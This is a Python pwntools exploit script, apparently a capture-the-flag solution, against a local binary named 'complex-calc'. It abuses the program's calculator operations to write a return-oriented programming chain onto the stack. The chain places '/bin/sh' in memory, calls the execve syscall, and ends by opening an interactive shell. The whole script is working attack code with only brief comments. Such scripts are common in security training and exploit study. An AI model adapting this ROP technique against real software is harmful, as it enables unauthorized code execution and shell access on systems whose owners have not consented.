#Import pwntools
from pwn import *

#Start the target process, attach gd
target = process('./complex-calc')
#gdb.attach(target, gdbscript = 'b *0x401551\nb *0x401556')

#Declare the ROP Gadgets
pop_rdi = 0x401b73
pop_rsi = 0x401c87
pop_rax = 0x44db34
pop_rdx = 0x437a85
write_gadget = 0x44526e

#Declare the other things which will be used in the ROP Chain
syscall = 0x400488
binsh0 = 0x6e69622f
binsh1 = 0x0068732f
space = 0x6c0000

#Declare the start function, which will just establish how many operations we will use
def start():
	target.sendline("50")
	target.recvuntil("=>")

#Declare the first function which will write values that we pass to it
def write(arg):
	x = arg - 100
	target.sendline("1")
	target.sendline(str(x))
	target.sendline("100")	
	target.recvuntil("=>")

#This is essentially the write function, however it writes 0x0000 after everything (helps format 8 byte segments)
def rop_write(arg):
	x = arg - 100
	target.sendline("1")
	target.sendline(str(x))
	target.sendline("100")	
	target.recvuntil("=>")
	write(0x0)

#This is just a function to recursively write 0x0000 to fill up space
def write_zeros(arg):
	for i in range(0, arg):
		write(0x0)

#This function just writes the rop Chain
def write_rop_chain():
	#Write the part of the ROP Chain to write "/bin/sh" to memory
	rop_write(pop_rax)
	rop_write(space)
	rop_write(pop_rdx)
	write(binsh0)
	write(binsh1)
	rop_write(write_gadget)

	#Make the syscall to get a shell
	rop_write(pop_rdi)
	rop_write(space)
	rop_write(pop_rdx)
	write(0x0)
	write(0x0)
	rop_write(pop_rsi)
	write(0x0)
	write(0x0)
	rop_write(pop_rax)
	rop_write(0x3b)
	rop_write(syscall)

#This function just adds the two integers together that we need in order to not crash free, than saves and exits the program to trigger the bug
def end():

	target.sendline("1")
	target.sendline("2688")
	target.sendline("-1278")
	target.recvuntil("=>")
	target.sendline("5")

#calling the functions to run the exploit
start()
write_zeros(12)
write(0x6c4a90)
write_zeros(5)
write_rop_chain()
end()

#Drop to an interactive shell
target.interactive()
